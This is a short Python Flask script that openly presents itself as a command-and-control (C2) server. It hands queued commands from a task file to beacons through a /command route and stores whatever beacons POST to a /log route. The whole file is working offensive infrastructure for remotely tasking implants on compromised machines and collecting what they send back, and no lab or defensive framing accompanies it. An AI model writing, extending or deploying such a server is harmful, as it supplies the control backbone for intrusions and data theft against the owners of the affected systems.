from flask import Flask, request

app = Flask(__name__)

@app.route('/command', methods=['GET'])
def send_command():
    with open("c2_tasks.txt", "r") as f:
        cmd = f.read().strip()
    return cmd or "noop"

@app.route('/log', methods=['POST'])
def receive_log():
    data = request.data.decode()
    with open("beacon_logs.txt", "a") as f:
        f.write(data + "\n")
    return "OK"

if __name__ == "__main__":
    print("[+] C2 server running on http://0.0.0.0:8000")
    app.run(host="0.0.0.0", port=8000)
